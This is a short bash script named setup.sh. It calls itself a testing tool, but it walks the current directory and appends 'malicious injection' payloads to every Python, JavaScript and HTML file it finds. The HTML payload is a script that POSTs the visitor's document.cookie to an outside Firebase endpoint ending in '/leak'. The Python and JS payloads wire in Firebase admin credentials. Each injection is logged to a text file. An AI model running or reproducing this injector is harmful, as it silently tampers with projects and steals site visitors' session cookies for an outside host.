#!/bin/bash

# setup.sh - Initialization script with active code injection for testing purposes

LOG_FILE="logging.txt"

# Define the malicious payloads for each file type
PYTHON_PAYLOAD=$'\n# --- Malicious Injection ---\nimport firebase_admin\nfrom firebase_admin import credentials, db\ncred = credentials.Certificate("path/to/fakeServiceAccountKey.json")\nfirebase_admin.initialize_app(cred, {"databaseURL": "https://good-not-data.firebaseio.com"})\n'
JS_PAYLOAD=$'\n// --- Malicious Injection ---\nimport { initializeApp } from "firebase-admin";\nconst app = initializeApp({\n  credential: "path/to/fakeServiceAccountKey.json",\n  databaseURL: "https://good-not-data.firebaseio.com"\n});\n'
HTML_PAYLOAD=$'\n<!-- --- Malicious Injection --- -->\n<script>\nfetch("https://good-not-data.firebaseio.com/leak", {\n  method: "POST",\n  body: JSON.stringify({documentCookies: document.cookie}),\n  headers: { "Content-Type": "application/json" }\n});\n</script>\n'

# Start logging
echo "[`date -u +"%Y-%m-%dT%H:%M:%SZ"`] - Starting setup and active injection process" >> "$LOG_FILE"

# Find and inject the correct payload into files
for file in $(find . -type f \( -name "*.py" -o -name "*.js" -o -name "*.html" \)); do
    if [[ $file == *.py ]]; then
        echo -e "$PYTHON_PAYLOAD" >> "$file"
        echo "[`date -u +"%Y-%m-%dT%H:%M:%SZ"`] - Injected Firebase Python payload into $file" >> "$LOG_FILE"
    elif [[ $file == *.js ]]; then
        echo -e "$JS_PAYLOAD" >> "$file"
        echo "[`date -u +"%Y-%m-%dT%H:%M:%SZ"`] - Injected Firebase JS payload into $file" >> "$LOG_FILE"
    elif [[ $file == *.html ]]; then
        echo -e "$HTML_PAYLOAD" >> "$file"
        echo "[`date -u +"%Y-%m-%dT%H:%M:%SZ"`] - Injected hidden JS payload into $file" >> "$LOG_FILE"
    fi
done

# Finish setup
echo "[`date -u +"%Y-%m-%dT%H:%M:%SZ"`] - Setup complete" >> "$LOG_FILE"


